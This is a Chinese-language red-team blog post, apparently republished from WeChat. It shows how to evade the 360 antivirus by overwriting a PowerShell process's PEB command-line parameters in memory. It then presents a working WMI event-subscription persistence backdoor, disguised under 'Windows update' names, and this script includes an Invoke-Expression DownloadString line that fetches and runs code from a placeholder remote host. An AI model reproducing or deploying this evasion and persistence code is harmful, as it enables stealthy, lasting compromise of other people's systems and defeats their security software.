> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Nxcx5dfYXKqbUyaNCKyrIA)

目录：

        一：原理  

        二：实验步骤

        三：免杀效果

        四：实验步骤

作者：an1m0re7@深蓝攻防实验室

1：原理  

    PEB 结构中 ProcessParameters 是命令行参数，通过在内存中获取到 ProcessParameters 的地址，进行覆盖，替换参数。peb 结构：https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb

2：实验步骤
------

1、首先创建一个 powershell 进程，参数为任意 (不被 360 查杀)，此处我未加参数。 ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cUyIcw8a1qGO4V2kPmfSJvicu0K727CPWehNRFYU7fBS1Mo4ibKXWDEMSdMdTAnywOWibfj27ic7hElA/640?wx_fmt=png)2、获取到 peb 地址。 ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cUyIcw8a1qGO4V2kPmfSJvyzO58UHRftwZoNCsNPz5yA1wP0HtqY1gaRiaev6Nd0LEu5FNLNRhdDg/640?wx_fmt=png)3、获取到 peb 结构中 ProcessParameters 地址，使用 wpm 函数进行替换。 ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cUyIcw8a1qGO4V2kPmfSJvm7XYbk7RJoQzP48rnDAbSxNe4Lmn0FG8s5r6ibrytHsuTLV85kBBUmQ/640?wx_fmt=png)

3：免杀效果
------

查看进程参数发现显示的还是 powershell.exe 没有参数。![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cUyIcw8a1qGO4V2kPmfSJvTBficJnh0biayzcel05TGxicm6IWSk7qoOUEwMv9u7N6eIIHyQW0VShUg/640?wx_fmt=png)

4：持久化
-----

可以配合 wmi 订阅事件后门做持久化。可以 bypass 360

```
$TimerArgs = @{
IntervalBetweenEvents = ([UInt32] 2000) # 30 min
SkipIfPassed = $False
TimerId ="Trigger" };
$Timer = Set-WmiInstance -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments $TimerArgs;
$EventFilterArgs = @{
EventNamespace = 'root/cimv2'
Name = "Windows update trigger"
Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'Trigger'"
QueryLanguage = 'WQL' };
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs;
write-output 'Invoke-Expression(New-Object System.Net.WebClient).DownloadString("http://xxxxxxx/a")' |out-file -filepath 'c:\xxx.ps1'
$FinalPayload = 'c:\agu.exe http://xxxxxxxx/a'

$CommandLineConsumerArgs = @{
Name = "Windows update consumer"
CommandLineTemplate = $FinalPayload
};
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs;
$FilterToConsumerArgs = @{
Filter = $Filter
Consumer = $Consumer
};
$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs;
```

可以配合 wmi 订阅事件后门做持久化。可以 bypass 360

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cUyIcw8a1qGO4V2kPmfSJv9QOLVPC6sfCnAd7dYvCFPRQobR0hADRTVBm3UbGhKibt74AicXQlhj9g/640?wx_fmt=png)